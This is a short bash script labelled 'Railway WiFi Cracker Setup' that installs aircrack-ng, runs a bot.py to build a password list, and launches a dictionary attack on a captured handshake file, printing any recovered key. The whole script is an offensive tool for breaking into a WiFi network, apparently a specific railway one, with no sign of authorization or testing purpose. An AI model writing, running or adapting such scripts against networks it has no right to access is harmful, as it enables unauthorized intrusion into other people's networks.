#!/bin/bash
set -e

echo "=== Railway WiFi Cracker Setup ==="

# Install dependencies
apt-get update && apt-get install -y aircrack-ng

echo "Starting password generation..."
python3 bot.py

if [ ! -f "capture.pcap" ]; then
  echo "❌ capture.pcap not found!"
  exit 1
fi

echo "Starting aircrack-ng attack..."
aircrack-ng -w pass.txt capture.pcap -l cracked.txt

echo "=== Process finished ==="
cat cracked.txt 2>/dev/null || echo "No password found or process interrupted."
